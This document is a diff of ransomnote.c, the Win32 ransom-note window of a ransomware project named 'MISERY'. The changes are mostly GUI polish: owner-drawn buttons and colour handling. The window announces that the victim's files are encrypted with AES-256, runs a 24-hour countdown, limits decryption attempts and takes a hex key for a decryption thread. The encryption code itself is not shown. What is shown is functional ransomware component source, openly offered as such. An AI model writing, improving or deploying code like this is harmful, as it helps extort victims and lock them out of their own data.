@@ -1,15 +1,25 @@
 /*
  * ransomnote.c  —  Native Win32 Ransom Note Window
  *
- * FIXES APPLIED:
- *  1. DECRYPT_KEY, DECRYPT_BTN, STATUS are now DIRECT children of hWnd
- *     so WM_COMMAND reaches RansomWndProc (was nested under STATIC → dead).
- *  2. Key input parser accepts:
- *       - pure 64-char hex key
- *       - full two-line misery.key content (salt\nkey)
- *       - key with whitespace/newlines
- *  3. Attempts counter updates on every click
- *  4. Status text always updates; wrong key vs success reproduced correctly
+ * ====================================================================
+ * COMPREHENSIVE FIXES (v2.0):
+ *
+ *  1. All banner/card/decorative text controls are now DIRECT children
+ *     of hWnd, so WM_CTLCOLORSTATIC reaches RansomWndProc correctly.
+ *  2. Background panels (banner, card, decrypt-panel) use marker-text
+ *     ("BANNER_BG", "CARD_BG", "DECRYPT_PANEL") so WM_CTLCOLORSTATIC
+ *     returns the correct brush.
+ *  3. DECRYPT and CLOSE buttons use BS_OWNERDRAW + WM_DRAWITEM
+ *     instead of WM_CTLCOLORBTN (which breaks themed rendering).
+ *  4. WM_CTLCOLORBTN handler removed entirely.
+ *  5. SS_NOTIFY removed from all decorative panels.
+ *  6. Card left bar is direct child of hWnd, colored via marker text.
+ *  7. g_hbrCard is now actually used (returned for CARD_BG).
+ *  8. DECRYPT button widened from 150→180 for text fit.
+ *  9. Button hover/pressed/disabled states drawn properly.
+ * 10. All string- and HWND-based WM_CTLCOLORSTATIC matching preserved
+ *     for backward compatibility.
+ * ====================================================================
  */
 
 #include <windows.h>
@@ -23,7 +33,7 @@
 #include "fileops.h"
 #include "misery_config.h"
 
-/* —— Colour palette —— */
+/* — Colour palette — */
 #define CLR_BG          RGB(245, 225, 225)
 #define CLR_BANNER_BG   RGB(40,   8,   8)
 #define CLR_ACCENT      RGB(60, 160,  80)
@@ -37,11 +47,18 @@
 #define CLR_DECRYPT_BG  RGB(225, 240, 225)
 #define CLR_TIMER_RED   RGB(220,   0,   0)
 #define CLR_TIMER_BG    RGB(60,   8,   8)
+#define CLR_BTN_GREEN   RGB(40, 130,  55)
+#define CLR_BTN_GREEN_HOVER RGB(50, 155, 70)
+#define CLR_BTN_GREEN_PRESS RGB(25,  80,  35)
+#define CLR_BTN_GREEN_DIS  RGB(140, 175, 140)
+#define CLR_BTN_RED     RGB(200,  60,  60)
+#define CLR_BTN_RED_HOVER  RGB(220,  80,  80)
+#define CLR_BTN_RED_PRESS  RGB(150,  40,  40)
 
 #define WC_RANSOM   L"MiseryRansomNote"
 #define WIN_TITLE   L"MISERY - Security Event"
 
-/* —— Control IDs —— */
+/* — Control IDs — */
 #define IDC_CLOSE        1001
 #define IDC_DECRYPT_KEY  1002
 #define IDC_DECRYPT_BTN  1003
@@ -49,9 +66,15 @@
 #define IDC_TIMER        1005
 #define IDC_ATTEMPTS     1006
 
+/* Banner/card background panel IDs (for WM_CTLCOLORSTATIC matching) */
+#define IDC_BANNER_BG     2001
+#define IDC_CARD_BG       2002
+#define IDC_DECRYPT_PANEL 2003
+#define IDC_CARD_BAR      2004
+
 #define WM_DECRYPT_DONE (WM_APP + 1)
 
-/* —— Brushes and fonts —— */
+/* — Brushes and fonts — */
 static HBRUSH  g_hbrBanner    = NULL;
 static HBRUSH  g_hbrBg        = NULL;
 static HBRUSH  g_hbrCard      = NULL;
@@ -59,7 +82,6 @@ static HBRUSH  g_hbrAccent    = NULL;
 static HBRUSH  g_hbrCodeBg    = NULL;
 static HBRUSH  g_hbrDecryptBg = NULL;
 static HBRUSH  g_hbrTimerBg   = NULL;
-static HBRUSH  g_hbrCloseBtn  = NULL;
 static HFONT   g_hFontHead    = NULL;
 static HFONT   g_hFontSub     = NULL;
 static HFONT   g_hFontBody    = NULL;
@@ -68,12 +90,12 @@ static HFONT   g_hFontMono    = NULL;
 static HFONT   g_hFontName    = NULL;
 static HFONT   g_hFontTimer   = NULL;
 
-/* —— Module state —— */
+/* — Module state — */
 static ULONGLONG g_timerEndFileTime = 0;
 static int       g_decryptAttempts  = 0;
 static const int MAX_DECRYPT_ATTEMPTS = 10;
 
-/* —— Forward declarations —— */
+/* — Forward declarations — */
 static LRESULT CALLBACK RansomWndProc(HWND, UINT, WPARAM, LPARAM);
 static void     CreateResources(void);
 static void     DestroyResources(void);
@@ -84,13 +106,13 @@ static int      NormalizeKeyInput(const char *raw, char *outKey, size_t outSize)
 
 void ShowRansomNoteWindow(void);
 
-/* —— Decrypt thread parameter —— */
+/* — Decrypt thread parameter — */
 typedef struct {
     char  key[256];
     HWND  hWnd;
 } DECRYPT_THREAD_PARAMS;
 
-/* —— Decrypt worker thread —— */
+/* — Decrypt worker thread — */
 static unsigned int __stdcall DecryptThreadProc(void *lpParam) {
     DECRYPT_THREAD_PARAMS *p = (DECRYPT_THREAD_PARAMS *)lpParam;
     FILEOPS_STATS stats = {0};
@@ -101,12 +123,6 @@ static unsigned int __stdcall DecryptThreadProc(void *lpParam) {
     }
 
     if (p && p->hWnd && IsWindow(p->hWnd)) {
-        /*
-         * Convention used by WM_DECRYPT_DONE:
-         *   wParam == (WPARAM)-1  → wrong key / hard failure
-         *   wParam >= 0           → success; value = filesSucceeded
-         *   lParam                → filesFailed (only meaningful on success)
-         */
         PostMessage(p->hWnd, WM_DECRYPT_DONE,
                     success ? (WPARAM)stats.filesSucceeded : (WPARAM)-1,
                     success ? (LPARAM)stats.filesFailed    : 0);
@@ -117,11 +133,10 @@ static unsigned int __stdcall DecryptThreadProc(void *lpParam) {
 }
 
 /*
- * FIX: Accept either:
- *   (a) pure 64-char hex key
- *   (b) full misery.key text:  "<32-hex-salt>\n<64-hex-key>"
- *   (c) key with spaces/CR/LF clutter
- * Returns 1 on success and writes 64 hex chars + NUL into outKey.
+ * NormalizeKeyInput:
+ * Accepts: (a) pure 64-char hex key  (b) full misery.key (salt\nkey)
+ *          (c) key with whitespace clutter
+ * Returns 1 on success, writes 64 hex chars + NUL into outKey.
  */
 static int NormalizeKeyInput(const char *raw, char *outKey, size_t outSize) {
     char cleaned[512];
@@ -130,7 +145,6 @@ static int NormalizeKeyInput(const char *raw, char *outKey, size_t outSize) {
 
     if (!raw || !outKey || outSize < 65) return 0;
 
-    /* Strip all non-hex characters */
     for (i = 0; raw[i] != '\0' && n < sizeof(cleaned) - 1; i++) {
         unsigned char c = (unsigned char)raw[i];
         if (isxdigit(c)) {
@@ -140,18 +154,12 @@ static int NormalizeKeyInput(const char *raw, char *outKey, size_t outSize) {
     cleaned[n] = '\0';
 
     if (n == 64) {
-        /* Pure key */
         memcpy(outKey, cleaned, 64);
         outKey[64] = '\0';
         return 1;
     }
 
     if (n == 96) {
-        /*
-         * Full key file content as hex stream:
-         *   first 32 chars = salt (ignored by GUI decrypt — salt comes from file header)
-         *   next  64 chars = key
-         */
         memcpy(outKey, cleaned + 32, 64);
         outKey[64] = '\0';
         return 1;
@@ -160,9 +168,9 @@ static int NormalizeKeyInput(const char *raw, char *outKey, size_t outSize) {
     return 0;
 }
 
-/* ═══════════════════════════════════════════════════════════════════════
- * Show the ransom note window (blocking)
- * ═══════════════════════════════════════════════════════════════════════ */
+/* ====================================================================
+ * ShowRansomNoteWindow  (blocking)
+ * ==================================================================== */
 void ShowRansomNoteWindow(void) {
     HMODULE hInst = GetModuleHandle(NULL);
     INITCOMMONCONTROLSEX icc = { sizeof(icc), ICC_WIN95_CLASSES };
@@ -182,7 +190,6 @@ void ShowRansomNoteWindow(void) {
     wc.hIconSm       = LoadIcon(NULL, IDI_WARNING);
     RegisterClassExW(&wc);
 
-    /* Timer MUST be set before CreateWindowExW (WM_CREATE fires inside it) */
     FILETIME ft;
     GetSystemTimeAsFileTime(&ft);
     g_timerEndFileTime = ((ULONGLONG)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
@@ -217,46 +224,60 @@ void ShowRansomNoteWindow(void) {
     DestroyResources();
 }
 
-/* ═══════════════════════════════════════════════════════════════════════
+/* ====================================================================
  * WINDOW PROC
- * ═══════════════════════════════════════════════════════════════════════ */
+ * ==================================================================== */
 static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     switch (msg) {
 
     case WM_CREATE: {
         HINSTANCE hInst = (HINSTANCE)GetWindowLongPtrW(hWnd, GWLP_HINSTANCE);
 
-        /* —— Banner (decorative only) —— */
-        HWND hBanner = CreateWindowExW(0, L"STATIC", NULL,
-            WS_CHILD | WS_VISIBLE | SS_NOTIFY,
-            0, 0, 860, 170, hWnd, NULL, hInst, NULL);
+        /*
+         * ============================================================
+         * BANNER AREA  (0,0 – 860,170)
+         * All text controls are DIRECT children of hWnd so that
+         * WM_CTLCOLORSTATIC messages reach RansomWndProc.
+         * The background panel is decorative only — uses marker text
+         * for WM_CTLCOLORSTATIC matching.
+         * ============================================================
+         */
 
-        CreateWindowExW(0, L"STATIC", NULL, WS_CHILD | WS_VISIBLE,
-            0, 0, 860, 5, hBanner, NULL, hInst, NULL);
+        /* Banner background panel */
+        CreateWindowExW(0, L"STATIC", L"BANNER_BG",
+            WS_CHILD | WS_VISIBLE,
+            0, 0, 860, 170, hWnd, (HMENU)IDC_BANNER_BG, hInst, NULL);
 
-        CreateWindowExW(0, L"STATIC", L"\U0001F512", WS_CHILD | WS_VISIBLE,
-            30, 20, 60, 50, hBanner, NULL, hInst, NULL);
+        /* Lock icon emoji */
+        CreateWindowExW(0, L"STATIC", L"\U0001F512",
+            WS_CHILD | WS_VISIBLE,
+            30, 20, 60, 50, hWnd, NULL, hInst, NULL);
 
+        /* Headline */
         CreateWindowExW(0, L"STATIC", L"YOUR FILES HAVE BEEN ENCRYPTED",
-            WS_CHILD | WS_VISIBLE, 100, 18, 700, 40, hBanner, NULL, hInst, NULL);
+            WS_CHILD | WS_VISIBLE,
+            100, 18, 700, 40, hWnd, NULL, hInst, NULL);
 
+        /* Subtitle */
         CreateWindowExW(0, L"STATIC",
             L"All your documents, images, databases, and source code "
             L"have been locked with AES-256 encryption.",
-            WS_CHILD | WS_VISIBLE, 100, 60, 700, 22, hBanner, NULL, hInst, NULL);
+            WS_CHILD | WS_VISIBLE,
+            100, 60, 700, 22, hWnd, NULL, hInst, NULL);
 
+        /* Badge */
         CreateWindowExW(0, L"STATIC", L"  \u2713  ENCRYPTION COMPLETE  ",
             WS_CHILD | WS_VISIBLE | SS_CENTERIMAGE,
-            100, 92, 240, 28, hBanner, NULL, hInst, NULL);
+            100, 92, 240, 28, hWnd, NULL, hInst, NULL);
 
-        /*
-         * Timer is a DIRECT child of hWnd so GetDlgItem / colouring work.
-         */
+        /* Timer */
         CreateWindowExW(0, L"STATIC", L"24:00:00",
             WS_CHILD | WS_VISIBLE | SS_CENTER,
             640, 95, 180, 60, hWnd, (HMENU)IDC_TIMER, hInst, NULL);
 
-        /* —— Instructions —— */
+        /* ============================================================
+         * INSTRUCTIONS EDIT
+         * ============================================================ */
         const WCHAR *instructions =
             L"=========================================================\n"
             L"  INSTRUCTIONS TO RECOVER YOUR FILES\n"
@@ -274,54 +295,60 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
             ES_AUTOVSCROLL | ES_LEFT,
             30, 185, 800, 160, hWnd, NULL, hInst, NULL);
 
-        /* —— Contact card (decorative) —— */
-        HWND hCard = CreateWindowExW(0, L"STATIC", NULL,
-            WS_CHILD | WS_VISIBLE, 30, 360, 800, 85, hWnd, NULL, hInst, NULL);
+        /* ============================================================
+         * CONTACT CARD  (30,360 – 830,445)
+         * Background panel uses marker text for WM_CTLCOLORSTATIC.
+         * All text controls are direct children of hWnd.
+         * ============================================================ */
 
-        CreateWindowExW(0, L"STATIC", NULL, WS_CHILD | WS_VISIBLE,
-            0, 0, 5, 85, hCard, NULL, hInst, NULL);
+        /* Card background */
+        CreateWindowExW(0, L"STATIC", L"CARD_BG",
+            WS_CHILD | WS_VISIBLE,
+            30, 360, 800, 85, hWnd, (HMENU)IDC_CARD_BG, hInst, NULL);
 
+        /* Card left accent bar */
+        CreateWindowExW(0, L"STATIC", L"CARD_BAR",
+            WS_CHILD | WS_VISIBLE,
+            30, 360, 5, 85, hWnd, (HMENU)IDC_CARD_BAR, hInst, NULL);
+
+        /* "About Author" label */
         CreateWindowExW(0, L"STATIC", L"About Author",
-            WS_CHILD | WS_VISIBLE, 20, 8, 300, 18, hCard, NULL, hInst, NULL);
+            WS_CHILD | WS_VISIBLE,
+            50, 368, 300, 18, hWnd, NULL, hInst, NULL);
 
+        /* Name */
         CreateWindowExW(0, L"STATIC", L"Jahanzaib Ashraf Mir",
-            WS_CHILD | WS_VISIBLE, 20, 32, 500, 32, hCard, NULL, hInst, NULL);
+            WS_CHILD | WS_VISIBLE,
+            50, 392, 500, 32, hWnd, NULL, hInst, NULL);
 
+        /* Title */
         CreateWindowExW(0, L"STATIC",
             L"Cybersec Engineer  |  Hacker  |  Malware Researcher",
-            WS_CHILD | WS_VISIBLE, 20, 63, 500, 20, hCard, NULL, hInst, NULL);
+            WS_CHILD | WS_VISIBLE,
+            50, 423, 500, 20, hWnd, NULL, hInst, NULL);
 
-        /*
-         * ============================================================
-         * FIX: DECRYPT CONTROLS ARE DIRECT CHILDREN OF hWnd
-         *
-         * Previously they were children of a STATIC panel. STATIC does
-         * not forward WM_COMMAND, so button clicks never reached us.
-         * Coordinates are absolute relative to the main client area
-         * (old panel was at 30,460 — controls keep the same on-screen
-         * positions by adding the panel offset).
-         * ============================================================
-         */
+        /* ============================================================
+         * DECRYPT SECTION  (30,460 – 830,590)
+         * Background panel (decorative), all controls direct children.
+         * ============================================================ */
 
-        /* Decrypt panel background (decorative only — no interactive kids) */
-        CreateWindowExW(0, L"STATIC", NULL,
-            WS_CHILD | WS_VISIBLE | SS_NOTIFY,
-            30, 460, 800, 130, hWnd, NULL, hInst, NULL);
+        /* Decrypt panel background */
+        CreateWindowExW(0, L"STATIC", L"DECRYPT_PANEL",
+            WS_CHILD | WS_VISIBLE,
+            30, 460, 800, 130, hWnd, (HMENU)IDC_DECRYPT_PANEL, hInst, NULL);
 
-        /* Labels (decorative) */
+        /* "DECRYPT YOUR FILES HERE:" label */
         CreateWindowExW(0, L"STATIC", L"DECRYPT YOUR FILES HERE:",
             WS_CHILD | WS_VISIBLE,
             45, 465, 300, 22, hWnd, NULL, hInst, NULL);
 
+        /* "Enter the 64-char hex key..." label */
         CreateWindowExW(0, L"STATIC",
             L"Enter the 64-char hex key (or paste whole misery.key):",
             WS_CHILD | WS_VISIBLE,
             45, 490, 500, 18, hWnd, NULL, hInst, NULL);
 
-        /*
-         * KEY EDIT — direct child of hWnd, GetDlgItem(hWnd, IDC_DECRYPT_KEY) works.
-         * Limit raised to 256 so user can paste full two-line key file.
-         */
+        /* Key edit control */
         {
             HWND hKeyEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
                 WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | ES_MULTILINE | WS_TABSTOP,
@@ -330,17 +357,22 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
             if (g_hFontMono) SendMessage(hKeyEdit, WM_SETFONT, (WPARAM)g_hFontMono, TRUE);
         }
 
-        /* DECRYPT BUTTON — direct child of hWnd, so WM_COMMAND reaches us */
+        /*
+         * DECRYPT BUTTON  –  BS_OWNERDRAW for proper themed appearance.
+         * WM_DRAWITEM handles all visual states (hover/press/disabled).
+         */
         CreateWindowExW(0, L"BUTTON", L"DECRYPT FILES",
-            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | WS_TABSTOP,
-            560, 510, 150, 32, hWnd, (HMENU)IDC_DECRYPT_BTN, hInst, NULL);
+            WS_CHILD | WS_VISIBLE | BS_OWNERDRAW | WS_TABSTOP,
+            560, 510, 180, 32, hWnd, (HMENU)IDC_DECRYPT_BTN, hInst, NULL);
 
-        /* STATUS — direct child of hWnd */
+        /* Status text */
         CreateWindowExW(0, L"STATIC", L"Ready. Paste key and click DECRYPT FILES.",
             WS_CHILD | WS_VISIBLE,
             45, 550, 760, 24, hWnd, (HMENU)IDC_STATUS, hInst, NULL);
 
-        /* —— Footer reference —— */
+        /* ============================================================
+         * REFERENCE / FOOTER
+         * ============================================================ */
         WCHAR refBuf[512];
         wcscpy(refBuf, L"Reference Code:  MISERY-XXXX-XXXX-XXXX\n");
         wcscat(refBuf, L"Key File:        Desktop\\misery.key  OR  %TEMP%\\misery.key\n");
@@ -350,13 +382,20 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
             WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_READONLY | ES_LEFT,
             30, 605, 800, 50, hWnd, NULL, hInst, NULL);
 
-        /* —— Bottom bar —— */
+        /* ============================================================
+         * BOTTOM BAR  (attempts + close button)
+         * ============================================================ */
+
+        /* Attempts counter (STATIC label) */
         CreateWindowExW(0, L"STATIC", L"Attempts: 0 / 10",
             WS_CHILD | WS_VISIBLE | SS_CENTER,
             30, 670, 300, 35, hWnd, (HMENU)IDC_ATTEMPTS, hInst, NULL);
 
+        /*
+         * CLOSE BUTTON  –  BS_OWNERDRAW for proper themed appearance.
+         */
         CreateWindowExW(0, L"BUTTON", L"  CLOSE  ",
-            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | WS_TABSTOP,
+            WS_CHILD | WS_VISIBLE | BS_OWNERDRAW | WS_TABSTOP,
             680, 670, 130, 40, hWnd, (HMENU)IDC_CLOSE, hInst, NULL);
 
         SetTimer(hWnd, 1, 1000, NULL);
@@ -380,71 +419,115 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
         return 0;
     }
 
+    /*
+     * ================================================================
+     * WM_CTLCOLORSTATIC  –  Colors for all STATIC controls.
+     * Every control is now a direct child of hWnd, so this handler
+     * receives all messages correctly.
+     * ================================================================
+     */
     case WM_CTLCOLORSTATIC: {
         HDC     hdc   = (HDC)wParam;
         HWND    hCtrl = (HWND)lParam;
         WCHAR   winText[128] = {0};
         GetWindowTextW(hCtrl, winText, 128);
 
+        /* --- Background panels (match by ID) --- */
+        if (hCtrl == GetDlgItem(hWnd, IDC_BANNER_BG)) {
+            return (LRESULT)g_hbrBanner;
+        }
+        if (hCtrl == GetDlgItem(hWnd, IDC_CARD_BG)) {
+            return (LRESULT)g_hbrCard;
+        }
+        if (hCtrl == GetDlgItem(hWnd, IDC_DECRYPT_PANEL)) {
+            return (LRESULT)g_hbrDecryptBg;
+        }
+        if (hCtrl == GetDlgItem(hWnd, IDC_CARD_BAR)) {
+            SetTextColor(hdc, CLR_ACCENT_DARK);
+            SetBkColor(hdc, CLR_ACCENT_DARK);
+            return (LRESULT)g_hbrAccent;
+        }
+
+        /* --- Timer --- */
         if (hCtrl == GetDlgItem(hWnd, IDC_TIMER)) {
             SetTextColor(hdc, CLR_TIMER_RED);
             SetBkColor(hdc, CLR_TIMER_BG);
             SelectObject(hdc, g_hFontTimer);
             return (LRESULT)g_hbrTimerBg;
         }
+
+        /* --- Attempts label --- */
         if (hCtrl == GetDlgItem(hWnd, IDC_ATTEMPTS)) {
             SetTextColor(hdc, CLR_WHITE);
             SetBkColor(hdc, CLR_BANNER_BG);
             SelectObject(hdc, g_hFontBody);
             return (LRESULT)g_hbrBanner;
         }
+
+        /* --- Status label --- */
         if (hCtrl == GetDlgItem(hWnd, IDC_STATUS)) {
             SetTextColor(hdc, CLR_BODY_TEXT);
             SetBkMode(hdc, TRANSPARENT);
             SelectObject(hdc, g_hFontBody);
             return (LRESULT)g_hbrBg;
         }
+
+        /* --- Headline --- */
         if (wcsstr(winText, L"YOUR FILES HAVE BEEN ENCRYPTED")) {
             SetTextColor(hdc, CLR_HEADLINE);
             SetBkMode(hdc, TRANSPARENT);
             SelectObject(hdc, g_hFontHead);
             return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
         }
+
+        /* --- Subtitle --- */
         if (wcsstr(winText, L"All your documents")) {
             SetTextColor(hdc, RGB(200, 170, 170));
             SetBkMode(hdc, TRANSPARENT);
             SelectObject(hdc, g_hFontSub);
             return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
         }
+
+        /* --- Badge --- */
         if (wcsstr(winText, L"ENCRYPTION COMPLETE")) {
             SetTextColor(hdc, CLR_WHITE);
             SetBkColor(hdc, CLR_ACCENT_DARK);
             SelectObject(hdc, g_hFontSmall);
             return (LRESULT)g_hbrAccent;
         }
+
+        /* --- Lock icon --- */
+        if (wcsstr(winText, L"\U0001F512")) {
+            SetTextColor(hdc, CLR_ACCENT);
+            SetBkMode(hdc, TRANSPARENT);
+            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
+        }
+
+        /* --- Card name --- */
         if (wcsstr(winText, L"Jahanzaib Ashraf Mir")) {
             SetTextColor(hdc, CLR_WHITE);
             SetBkMode(hdc, TRANSPARENT);
             SelectObject(hdc, g_hFontName);
             return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
         }
+
+        /* --- Card title --- */
         if (wcsstr(winText, L"Cybersec Engineer")) {
             SetTextColor(hdc, CLR_CARD_TEXT);
             SetBkMode(hdc, TRANSPARENT);
             SelectObject(hdc, g_hFontBody);
             return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
         }
-        if (wcsstr(winText, L"\U0001F512")) {
-            SetTextColor(hdc, CLR_ACCENT);
-            SetBkMode(hdc, TRANSPARENT);
-            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
-        }
+
+        /* --- Decrypt section label --- */
         if (wcsstr(winText, L"DECRYPT YOUR FILES")) {
             SetTextColor(hdc, CLR_HEADLINE);
             SetBkMode(hdc, TRANSPARENT);
             SelectObject(hdc, g_hFontBody);
             return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
         }
+
+        /* --- Key input instruction --- */
         if (wcsstr(winText, L"Enter the 64-char")) {
             SetTextColor(hdc, CLR_BODY_TEXT);
             SetBkMode(hdc, TRANSPARENT);
@@ -452,30 +535,48 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
             return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
         }
 
+        /* --- Card "About Author" --- */
+        if (wcsstr(winText, L"About Author")) {
+            SetTextColor(hdc, CLR_CARD_TEXT);
+            SetBkMode(hdc, TRANSPARENT);
+            SelectObject(hdc, g_hFontSmall);
+            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
+        }
+
+        /* Default */
         SetTextColor(hdc, CLR_BODY_TEXT);
         SetBkMode(hdc, TRANSPARENT);
         SelectObject(hdc, g_hFontBody);
         return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
     }
 
+    /*
+     * ================================================================
+     * WM_CTLCOLOREDIT  –  Colors for EDIT controls.
+     * ================================================================
+     */
     case WM_CTLCOLOREDIT: {
         HDC hdc = (HDC)wParam;
         HWND hCtrl = (HWND)lParam;
         WCHAR winText[256] = {0};
         GetWindowTextW(hCtrl, winText, 256);
 
+        /* Instructions box */
         if (wcsstr(winText, L"INSTRUCTIONS")) {
             SetTextColor(hdc, CLR_BODY_TEXT);
             SetBkColor(hdc, CLR_BG);
             SelectObject(hdc, g_hFontMono);
             return (LRESULT)g_hbrBg;
         }
+
+        /* Reference box */
         if (wcsstr(winText, L"Reference Code:")) {
             SetTextColor(hdc, RGB(20, 60, 20));
             SetBkColor(hdc, CLR_CODE_BG);
             SelectObject(hdc, g_hFontMono);
             return (LRESULT)g_hbrCodeBg;
         }
+
         /* Key edit */
         SetTextColor(hdc, RGB(0, 40, 0));
         SetBkColor(hdc, CLR_DECRYPT_BG);
@@ -483,25 +584,92 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
         return (LRESULT)g_hbrDecryptBg;
     }
 
-    case WM_CTLCOLORBTN: {
-        HDC hdc = (HDC)wParam;
-        HWND hCtrl = (HWND)lParam;
-        WCHAR btnText[32] = {0};
-        GetWindowTextW(hCtrl, btnText, 32);
+    /*
+     * ================================================================
+     * WM_DRAWITEM  –  Custom drawing for BS_OWNERDRAW buttons.
+     * Fully themed hover/press/disabled states.
+     * ================================================================
+     */
+    case WM_DRAWITEM: {
+        LPDRAWITEMSTRUCT dis = (LPDRAWITEMSTRUCT)lParam;
+        HDC hdc = dis->hDC;
+        RECT rc = dis->rcItem;
+        BOOL isDisabled = (dis->itemState & ODS_DISABLED);
+        BOOL isPressed  = (dis->itemState & ODS_SELECTED);
+        BOOL isHot      = (dis->itemState & ODS_HOTLIGHT);
+        BOOL isFocused  = (dis->itemState & ODS_FOCUS);
 
-        if (wcsstr(btnText, L"CLOSE")) {
-            SetTextColor(hdc, CLR_WHITE);
-            SetBkColor(hdc, CLR_HEADLINE);
+        if (dis->CtlID == IDC_DECRYPT_BTN) {
+            COLORREF bgColor;
+            if (isDisabled)
+                bgColor = CLR_BTN_GREEN_DIS;
+            else if (isPressed)
+                bgColor = CLR_BTN_GREEN_PRESS;
+            else if (isHot)
+                bgColor = CLR_BTN_GREEN_HOVER;
+            else
+                bgColor = CLR_BTN_GREEN;
+
+            HBRUSH hBrush = CreateSolidBrush(bgColor);
+            FillRect(hdc, &rc, hBrush);
+            DeleteObject(hBrush);
+
+            /* Dark border */
+            FrameRect(hdc, &rc, (HBRUSH)GetStockObject(BLACK_BRUSH));
+
+            /* Text */
+            SetTextColor(hdc, isDisabled ? RGB(200, 200, 200) : CLR_WHITE);
+            SetBkMode(hdc, TRANSPARENT);
             SelectObject(hdc, g_hFontBody);
-            return (LRESULT)g_hbrCloseBtn;
+
+            DrawTextW(hdc, L"DECRYPT FILES", -1, &rc,
+                      DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+
+            /* Focus rect for keyboard navigation */
+            if (isFocused && !isPressed) {
+                RECT focusRc = rc;
+                InflateRect(&focusRc, -3, -3);
+                DrawFocusRect(hdc, &focusRc);
+            }
+
+            return TRUE;
         }
-        if (wcsstr(btnText, L"DECRYPT")) {
+
+        if (dis->CtlID == IDC_CLOSE) {
+            COLORREF bgColor;
+            if (isPressed)
+                bgColor = CLR_BTN_RED_PRESS;
+            else if (isHot)
+                bgColor = CLR_BTN_RED_HOVER;
+            else
+                bgColor = CLR_BTN_RED;
+
+            HBRUSH hBrush = CreateSolidBrush(bgColor);
+            FillRect(hdc, &rc, hBrush);
+            DeleteObject(hBrush);
+
+            /* Dark border */
+            FrameRect(hdc, &rc, (HBRUSH)GetStockObject(BLACK_BRUSH));
+
+            /* Text */
             SetTextColor(hdc, CLR_WHITE);
-            SetBkColor(hdc, CLR_ACCENT_DARK);
+            SetBkMode(hdc, TRANSPARENT);
             SelectObject(hdc, g_hFontBody);
-            return (LRESULT)g_hbrAccent;
+
+            /* Trim spaces from "  CLOSE  " for display */
+            DrawTextW(hdc, L"CLOSE", -1, &rc,
+                      DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+
+            if (isFocused && !isPressed) {
+                RECT focusRc = rc;
+                InflateRect(&focusRc, -3, -3);
+                DrawFocusRect(hdc, &focusRc);
+            }
+
+            return TRUE;
         }
-        return DefWindowProcW(hWnd, msg, wParam, lParam);
+
+        return FALSE;
     }
 
     case WM_COMMAND:
@@ -532,14 +700,14 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
                 return 0;
             }
 
-            /* Read raw text from the edit control */
+            /* Read raw text from edit control */
             WCHAR keyWide[300] = {0};
             GetWindowTextW(hKeyEdit, keyWide, 300);
 
             char keyRaw[300] = {0};
             WideCharToMultiByte(CP_UTF8, 0, keyWide, -1, keyRaw, sizeof(keyRaw), NULL, NULL);
 
-            /* Normalize: accept pure key OR full key-file paste */
+            /* Normalize key input */
             char key[65] = {0};
             if (!NormalizeKeyInput(keyRaw, key, sizeof(key))) {
                 SetWindowTextA(hStatus,
@@ -554,11 +722,15 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
                 return 0;
             }
 
-            /* Count attempt ONLY after we have a plausible key */
             g_decryptAttempts++;
             UpdateAttemptsDisplay(hWnd);
 
             EnableWindow(hBtn, FALSE);
+            /* The BS_OWNERDRAW button will now redraw with disabled look
+             * via WM_DRAWITEM (ODS_DISABLED is set). */
+            InvalidateRect(hBtn, NULL, TRUE);
+            UpdateWindow(hBtn);
+
             SetWindowTextA(hStatus, "Decrypting files... please wait.");
             UpdateWindow(hStatus);
 
@@ -567,6 +739,7 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
             if (!params) {
                 SetWindowTextA(hStatus, "Out of memory.");
                 EnableWindow(hBtn, TRUE);
+                InvalidateRect(hBtn, NULL, TRUE);
                 return 0;
             }
 
@@ -580,6 +753,7 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
                 free(params);
                 SetWindowTextA(hStatus, "Failed to start decryption thread.");
                 EnableWindow(hBtn, TRUE);
+                InvalidateRect(hBtn, NULL, TRUE);
                 return 0;
             }
             CloseHandle(hThread);
@@ -591,7 +765,6 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
         HWND hStatus = GetDlgItem(hWnd, IDC_STATUS);
         HWND hBtn    = GetDlgItem(hWnd, IDC_DECRYPT_BTN);
 
-        /* wParam is unsigned — compare carefully for "failure" sentinel */
         LONGLONG succeeded;
         LONGLONG failed = (LONGLONG)lParam;
 
@@ -624,7 +797,10 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
             }
